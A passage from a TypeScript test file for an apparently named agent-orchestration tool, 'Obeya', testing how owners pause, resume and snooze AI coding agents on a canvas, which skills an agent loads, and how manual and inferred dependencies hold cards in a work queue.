  expect(c.board.item(a.id)!.pausing).toBe(true);
  expect(c.board.canvas).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
  worker.emit({ type: 'idle' });
  await heard();
  expect(worker.closed).toBe(true);
  expect(c.board.item(a.id)!.paused).toBe(true);
  expect(c.board.canvas).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
  // a card started meanwhile: the Coordinator judges it as ever, and it waits in the queue
  const workers = () => runtime.sessions.filter((s) => s.spec.role === 'worker').length;
  const before = workers();
  const b = c.board.create({ title: 'B', x: 0, y: 0 });
  c.act(b.id, { action: 'start' });
  await until(() => runtime.withTool('scope').length > 0);
  const estimate = runtime.withTool('scope')[0]!;
  estimate.call('scope', { files: ['b.ts'], conflicts_with: [], reason: '' });
  estimate.emit({ type: 'idle' });
  await until(() => !!c.board.item(b.id)!.queue && 'paused' in c.board.item(b.id)!.queue!);
  expect(workers()).toBe(before);
  c.resumeAgents();
  expect(c.board.canvas.paused).toBeUndefined();
  const resumed = runtime.sessions.find((s) => s.spec.resume === 's-a')!;
  expect(resumed.inbox[0]).toContain('The owner paused you');
  await until(() => c.board.item(b.id)!.state === 'working');
}, 30_000);

test("a canvas's pause ends once none of its agents is paused any more, and lasts over a restart until then", async () => {
  const store = new Store(':memory:');
  const config = { name: 'Pause', repos: [{ path: repo('solo', 'Solo'), clones: 2 }] };
  let c = await start(config, { store, home: dir, runtime, forge: noForge });
  const a = c.board.create({ title: 'A', x: 0, y: 0 });
  await c.repos[0]!.workers.start(a.id);
  const worker = runtime.sessions.at(-1)!;
  worker.emit({ type: 'session', id: 's-a' });
  worker.emit({ type: 'text', text: 'Arbeite.' });
  // Obeya stops while the agent is about to pause: it is paused when Obeya runs again
  c.pauseAgents();
  await stop(c);
  c = await start(config, { store, home: dir, runtime, forge: noForge });
  expect(c.board.canvas).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
  // the owner resumes the card on its own: nothing on the canvas is paused any more
  c.act(a.id, { action: 'resume' });
  await heard();
  expect(c.board.canvas.paused).toBeUndefined();
}, 30_000);

test("a card the owner snoozed counts as no paused agent: resuming the canvas leaves it asleep, and it does not hold the queue", async () => {
  const c = await start({ name: 'Pause', repos: [{ path: repo('solo', 'Solo'), clones: 2 }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
  const atWork = async (title: string, session: string) => {
    const card = c.board.create({ title, x: 0, y: 0 });
    await c.repos[0]!.workers.start(card.id);
    const worker = runtime.sessions.at(-1)!;
    worker.emit({ type: 'session', id: session });
    worker.emit({ type: 'text', text: 'Arbeite.' });
    return card;
  };
  const later = await atWork('Later', 's-later');
  const now = await atWork('Now', 's-now');
  // "Later …": its worker stops until then, holding what comes for it as a paused one does
  c.act(later.id, { action: 'snooze', until: new Date(Date.now() + 3_600_000).toISOString() });
  await heard();
  expect(c.board.canvas.agents).toEqual({ running: 1, paused: 0 });
  c.pauseAgents();
  await heard();
  expect(c.board.canvas).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
  // the one paused resumed on its own card: none is paused any more, and the queue runs again
  c.act(now.id, { action: 'resume' });
  await heard();
  expect(c.board.canvas.paused).toBeUndefined();
  // nor does resuming the canvas wake the snoozed one
  c.resumeAgents();
  expect(c.board.item(later.id)!.snoozed).toMatchObject({ by: 'owner' });
  expect(runtime.sessions.some((s) => s.spec.resume === 's-later')).toBe(false);
}, 30_000);

test("a canvas's pause lasts while one of its paused agents cannot go on, its repository gone from the canvas", async () => {
  const both: RepoConfig[] = [
    { path: repo('front', 'Front'), clones: 1 },
    { path: repo('back', 'Back'), clones: 1 },
  ];
  const c = await start({ name: 'Pause', repos: both }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
  const [front, back] = c.repos.map((r) => r.ref.id);
  const atWork = async (repo: string, session: string) => {
    const card = c.board.create({ title: repo, x: 0, y: 0, repo });
    await c.repoOf(card.id).workers.start(card.id);
    const worker = runtime.sessions.at(-1)!;
    worker.emit({ type: 'session', id: session });
    worker.emit({ type: 'text', text: 'Arbeite.' });
    return card;
  };
  await atWork(front!, 's-front');
  const gone = await atWork(back!, 's-back');
  c.pauseAgents();
  // both end their turn at a safe point
  for (const s of runtime.sessions.filter((s) => s.spec.resume === undefined && s.spec.role === 'worker').slice(-2)) s.emit({ type: 'idle' });
  await heard();
  expect(c.board.canvas.agents).toEqual({ running: 0, paused: 2 });
  await c.apply({ name: 'Pause', repos: [both[0]!] });
  await until(() => c.repos.length === 1);
  const errors = quiet();
  c.resumeAgents();
  errors.restore();
  expect(errors.lines.join('\n')).toContain(`the agent of ${gone.id} did not resume`);
  expect(runtime.sessions.some((s) => s.spec.resume === 's-front')).toBe(true);
  // the card that could not go on is still paused, and the cards let start still wait
  expect(c.board.item(gone.id)!.paused).toBe(true);
  await heard();
  expect(c.board.canvas).toMatchObject({ paused: true, agents: { paused: 1 } });
  // its repository back, it goes on, and the pause ends
  await c.apply({ name: 'Pause', repos: both });
  await until(() => c.repos.length === 2);
  c.resumeAgents();
  expect(runtime.sessions.some((s) => s.spec.resume === 's-back')).toBe(true);
  await heard();
  expect(c.board.canvas.paused).toBeUndefined();
}, 30_000);

describe("the skills of a card's agent", () => {
  test('are those Claude Code lists in its repository, with the plugins its agent loads', async () => {
    const asked: SkillPlace[] = [];
    const web = repo('web', 'Web');
    const c = await start(
      { name: 'Skills', repos: [{ path: web, clones: 1, settings: { land: 'pr' } }] },
      { store: new Store(':memory:'), home: join(dir, 'skills-home'), runtime: new FakeRuntime(), forge: noForge, skills: new Skills(async (p) => (asked.push(p), [{ name: 'review', description: 'Reviews' }])) },
    );
    const task = c.board.create({ title: 'Task', x: 0, y: 0 });
    expect(await c.skillsOf(task.id)).toEqual([{ name: 'review', description: 'Reviews' }]);
    const idea = c.board.create({ title: 'Idea', x: 0, y: 0, idea: true });
    await c.skillsOf(idea.id);
    const read = c.repos[0]!.read.path;
    expect(asked).toEqual([
      { cwd: read, plugins: [OBEYA_PLUGIN], untrusted: false },
      // an idea's agent loads no plugins
      { cwd: read, plugins: [], untrusted: false },
    ]);
    expect(await c.skillsOf('nope').catch(() => 'refused')).toEqual([]);
  });
});

test('a manual dependency holds a requested card until removed', async () => {
  await produkt();
  const a = canvas.board.create({ title: 'Prerequisite', x: 0, y: 0 });
  const b = canvas.board.create({ title: 'Dependent', x: 400, y: 0 });
  canvas.board.connect(a.id, b.id);
  canvas.act(b.id, { action: 'start' });
  await until(() => !!item(b.id).queue && 'behind' in item(b.id).queue!);
  const t = canvas.board.t.coordinator;
  expect(item(b.id).queue).toMatchObject({ behind: [a.id], reason: t.drawn });
  expect(item(b.id).state).toBe('planned');
  // the card says why it waits: the owner connected it, not a wait Obeya inferred
  expect(canvas.board.events(b.id).at(-1)).toMatchObject({ kind: 'state', author: 'obeya', text: t.waitsFor(t.notStarted('„Prerequisite“'), t.drawn) });
  canvas.board.connect(a.id, b.id, true);
  await until(() => item(b.id).state === 'working');
  await settle();
});

test('removing a manual dependency leaves an independently inferred wait intact', async () => {
  await produkt();
  const a = canvas.board.create({ title: 'Prerequisite', x: 0, y: 0 });
  const b = canvas.board.create({ title: 'Dependent', x: 400, y: 0 });
  canvas.board.work(b.id, { queue: JSON.stringify({ behind: [a.id], buildsOn: [a.id], reason: 'plan', since: new Date().toISOString() }) });
  canvas.board.connect(a.id, b.id);
  await settle();
  canvas.board.connect(a.id, b.id, true);
  await settle();
  expect(item(b.id).queue).toMatchObject({ behind: [a.id], buildsOn: [a.id] });
  expect(item(b.id).state).toBe('planned');
});

describe('owner-drawn dependencies in the queue', () => {
  beforeEach(produkt);

  const estimate = () => runtime.withTool('scope').at(-1)!;
  /** Answers the latest estimate once its brief is written, with a likely conflict with each card it lists, or none. */
  async function judge(conflict: boolean) {
    await until(() => estimate()?.inbox[0]);
    const s = estimate();
    s.call('scope', { files: ['src/index.ts'], conflicts_with: conflict ? [...new Set(s.inbox[0]!.match(/\bK\d+\b/g) ?? [])] : [], reason: '' });
    s.emit({ type: 'idle' });
    await settle();
  }
  /** A card at work in "web", holding its only clone. */
  async function atWork(title: string) {
    const x = canvas.board.create({ title, x: 0, y: 0 });
    await canvas.repoOf(x.id).workers.start(x.id);
    await settle();
    return x;
  }

  test('a card waiting for a workspace that an arrow then holds is not ahead of its prerequisite, so the two never wait for each other', async () => {
    await atWork('Running');
    const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
    canvas.board.work(a.id, { queue: JSON.stringify({ workspace: 'none', since: new Date(Date.now() - 1000).toISOString() }) });
    await settle();
    const b = canvas.board.create({ title: 'B', x: 400, y: 0 });
    canvas.board.connect(b.id, a.id);
    await settle();
    expect(item(a.id).queue).toMatchObject({ behind: [b.id], manualWait: [b.id] });
    canvas.act(b.id, { action: 'start' });
    // whatever B's estimate says, it cannot come to wait for A
    await judge(true);
    expect(estimate().inbox[0]).not.toContain('"A"');
    expect(item(b.id).queue).toMatchObject({ behind: [expect.not.stringMatching(a.id)] });
    expect(item(a.id).queue).toMatchObject({ behind: [b.id] });
  });

  test('an arrow drawn over a wait the Coordinator inferred leaves that wait as it was once removed', async () => {
    const a = await atWork('A');
    const b = canvas.board.create({ title: 'B', x: 400, y: 0 });
    canvas.act(b.id, { action: 'start' });
    await judge(true);
    expect(item(b.id).queue).toMatchObject({ behind: [a.id] });
    const p = canvas.board.create({ title: 'Prerequisite', x: 0, y: 400 });
    canvas.board.connect(a.id, b.id);
    canvas.board.connect(p.id, b.id);
    await settle();
    expect(item(b.id).queue).toMatchObject({ behind: [a.id, p.id], manualWait: [p.id] });
    // the arrow drawn while it waited is said once; the one over the inferred wait adds nothing to say
    const t = canvas.board.t.coordinator;
    expect(canvas.board.events(b.id).filter((e) => e.author === 'obeya' && e.text.includes(t.drawn)).map((e) => e.text)).toEqual([t.waitsFor(t.notStarted('„Prerequisite“'), t.drawn)]);
    canvas.board.connect(a.id, b.id, true);
    await settle();
    // a likely conflict holds only while A is in progress; the other arrow holds on
    await canvas.repoOf(a.id).workers.stop(a.id);
    await settle();
    expect(item(b.id).queue).toEqual(expect.objectContaining({ behind: [p.id], manualWait: [p.id] }));
    expect(item(b.id).queue).not.toHaveProperty('buildsOn');
    canvas.board.connect(p.id, b.id, true);
    await until(() => item(b.id).state === 'working');
  });

  test('an arrow holds on where the wait the Coordinator inferred ended, and its removal frees the card', async () => {
    const a = await atWork('A');
    const b = canvas.board.create({ title: 'B', x: 400, y: 0 });
    canvas.act(b.id, { action: 'start' });
    await judge(true);
    canvas.board.connect(a.id, b.id);
    await canvas.repoOf(a.id).workers.stop(a.id);
    await settle();
    // A stopped has not landed: the arrow still holds B
    expect(item(b.id)).toMatchObject({ state: 'planned', queue: { behind: [a.id], manualWait: [a.id] } });
    canvas.board.connect(a.id, b.id, true);
    await until(() => item(b.id).state === 'working');
  });

  test('an arrow drawn while a card is judged keeps it from waiting for the card the arrow holds', async () => {
    await atWork('Running');
    const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
    canvas.board.work(a.id, { queue: JSON.stringify({ workspace: 'none', since: new Date(Date.now() - 1000).toISOString() }) });
    const b = canvas.board.create({ title: 'B', x: 400, y: 0 });
    canvas.act(b.id, { action: 'start' });
    await until(() => estimate()?.inbox[0]);
    expect(estimate().inbox[0]).toContain(`K${a.number}: "A"`);
    canvas.board.connect(b.id, a.id);
    await judge(true);
    expect(item(b.id).queue).toMatchObject({ behind: [expect.not.stringMatching(a.id)] });
    expect(item(a.id).queue).toMatchObject({ behind: [b.id] });
  });

  test('a merged card waited for by an inferred wait stays so waited for where an arrow named another merged into it', async () => {
    const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
    const b = canvas.board.create({ title: 'B', x: 0, y: 200 });
    const c = canvas.board.create({ title: 'C', x: 400, y: 0 });
    const since = new Date().toISOString();
    for (const x of [a, b]) canvas.board.work(x.id, { queue: JSON.stringify({ workspace: 'none', since }) });
    canvas.board.work(c.id, { queue: JSON.stringify({ behind: [a.id, b.id], reason: 'R', manualWait: [b.id], since }) });
    canvas.board.merge(a.id, [b.id], 'A and B');
    expect(canvas.board.row(c.id).queue).toBe(JSON.stringify({ behind: [a.id], reason: 'R', since }));
  });

  test('a card started anyway waits for a workspace without an arrow holding it again', async () => {
    const x = await atWork('Running');
    const p = canvas.board.create({ title: 'Prerequisite', x: 0, y: 0 });
    const a = canvas.board.create({ title: 'A', x: 400, y: 0 });
    canvas.board.connect(p.id, a.id);
    canvas.act(a.id, { action: 'start' });
    await judge(false);
    expect(item(a.id).queue).toMatchObject({ behind: [p.id], manualWait: [p.id] });
    canvas.act(a.id, { action: 'force' });
    await settle();
    expect(item(a.id).queue).toMatchObject({ workspace: 'none', begun: true });
    await canvas.repoOf(x.id).workers.stop(x.id);
    await until(() => item(a.id).state === 'working');
  });
});
